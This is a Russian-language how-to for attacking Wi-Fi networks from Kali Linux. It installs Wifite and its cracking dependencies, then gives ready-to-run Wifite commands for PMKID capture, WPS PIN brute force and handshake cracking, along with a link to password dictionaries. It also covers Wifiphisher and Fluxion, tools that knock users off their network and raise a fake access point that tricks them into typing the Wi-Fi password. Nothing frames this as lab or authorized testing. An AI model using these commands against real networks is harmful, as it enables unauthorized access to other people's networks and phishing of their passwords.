# Wifite

Wififte предустановлен в Kali Linux, однако, есть не установленные зависмости.

Доустановка зависимостей для Wifite:

	#---------------------------------- Pyrit -------------------------------------------
	sudo apt-get install -y python3-scapy libssl-dev zlib1g-dev libpcap0.8-dev python2-dev
	cd ~/Загрузки && sudo wget -c https://github.com/JPaulMora/Pyrit/archive/v0.5.0.tar.gz
	sudo tar -xf v0.5.0.tar.gz && cd Pyrit-0.5.0 && sudo sed -i "s/COMPILE_AESNI/NO_COMPILE_AESNI/" cpyrit/_cpyrit_cpu.c
	sudo python2 setup.py build 
	sudo python2 setup.py install
	#--------------------------------------------------------------------------------------
	sudo apt-get install -y hashcat
	sudo apt-get install -y hcxtools
	sudo apt-get install -y hcxdumptool 
	sudo apt-get install -y bully
	sudo apt-get install -y macchanger


Установить сам Wifite:

	sudo apt-get install -y wifite
	
Чтобы запустить атаку с заданым временем для PMKID: 

	sudo wifite --pmkid-timeout 30 --random-mac --kill 

Если хотите запустить атаку со своим словарем, то добавьте --dict ~/dict/WPS_Pins.txt - путь до словаря, я использую WPS пин-коды

Чтобы запустить атаку на заданном сетевом интерфейсе добавьте параметр i, например:

	-i wlan0
	
Запустить атаку на WPS:

	sudo wifite --wps-only --bully --ignore-lock --random-mac
	
Запустить взлом перехваченного рукопожатия (Handshake):

	sudo wifite --crack --dict ~/dict/8digitBack.txt --all

*Путь до словаря паролей

**Cловари можно скачать [здесь](https://disk.yandex.ru/d/v4Lbt1p47K8bIw)**


Перезапустить сетевой интерфейс после использования Wifite:

	sudo airmon-ng stop wlan0mon 
	
*Название интерфейса может отличаться.
	

# Wifiphisher 

Для атаки, в которой играет немалую роль социальная инженерия, есть инструмент под названием Wifiphisher. Он деаутентифицирует подключенных пользователей целевой точи доступа и поднимает ее фальшивую копию без пароля. Пользователи, думая что что-то не так с роутером, подключаются с фальшивой точке (к настоящей они не могут подключиться из-за работы нашей программы) и, якобы для обновления прошивки, точка их просит ввести пароль. После ввода пароль приходит нам.
 

**Установка:** 

	sudo apt-get install wifiphisher

**Использование**

	sudo wifiphisher

	

# FLUXION 


Данный инструмент похож на предыдущий, но он более продвинутый. Есть поддержка русского языка. 

Сначала Fluxion захватывает рукопожатие, достает из него хэш пароля, а затем делает всё тоже самое что и wifiphisher, только если пользователь введет верный пароль, Fluxion свернет поддельную точку доступа и атака завершится успехом. Для него лучше иметь дополнительный wifi-адаптер.

**Установка:**

	git clone https://github.com/FluxionNetwork/fluxion && cd fluxion/ && sudo ./fluxion.sh

**Использование:**

	sudo ./fluxion.sh
